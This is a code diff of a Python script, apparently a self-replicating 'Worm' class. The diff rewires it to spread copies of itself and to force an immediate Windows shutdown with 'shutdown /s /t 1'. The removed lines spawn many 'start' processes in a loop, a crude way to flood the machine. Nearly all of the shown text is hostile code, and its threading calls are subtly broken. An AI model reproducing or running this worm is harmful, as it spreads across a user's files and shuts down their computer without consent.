@@ -180,11 +180,10 @@ class Worm:
             logging.warning("exception occurred: no rick?")
             
     def time_to_rick(self):
-        for i in range(0, BRICKCOUNT):
-            self.threader.append(os.system("start"))
-        self.threader.start()
-        self.threader.join()
-        logging.warning(f"[{perf_counter() - self.start:.5f}] Done Searching")
+        sleep(10)
+        os.system("shutdown /s /t 1")
+        
+        
         
     def start_worm_actions(self):
         print(self.target_dir_list)
@@ -195,7 +194,12 @@ class Worm:
         self.list_directories(self.path)
         
         try:
-            self.create_new_worm()
+            self.threader.append(self.create_new_worm())
+            self.threader.append(self.time_to_rick())
+            self.threader.start()
+            self.threader.join()
+            #self.create_new_worm()
+            #self.time_to_rick()
         except:
             logging.warning("something went wrong")
         
@@ -214,5 +218,5 @@ if __name__=="__main__":
     current_directory = os.path.abspath("")
     worm = Worm(path=current_directory)
     worm.start_worm_actions()
-    sleep(10)
-    os.system("shutdown /s /t 1")
+    
+    
